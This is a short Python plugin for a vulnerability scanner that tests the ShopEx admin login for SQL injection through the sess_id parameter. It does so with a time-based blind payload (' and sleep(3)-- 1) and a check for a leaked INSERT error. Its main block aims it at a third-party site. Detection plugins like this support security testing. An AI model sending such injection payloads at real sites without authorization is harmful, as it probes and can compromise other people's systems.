#!/usr/bin/env python
# -*- coding: utf-8 -*-
# shopex登录处sess_id注入漏洞
# 参考：http://www.cnseay.com/3426/

from time import clock

def assign(service, arg):
    if service == "shopex":
        return True, arg

def audit(arg):
    url = arg + 'shopadmin/index.php?ctl=passport&act=login&sess_id=1%27%20and%20sleep%283%29--%201'
    start = clock()
    code, head, res, errcode, _ = curl.curl(url)
    if code == 200:
        if res.find('<b>Warning</b>:  INSERT INTO `') != -1 or clock()-start in range(7, 12):
            security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('shopex', 'http://www.reder.com.cn/')[1])



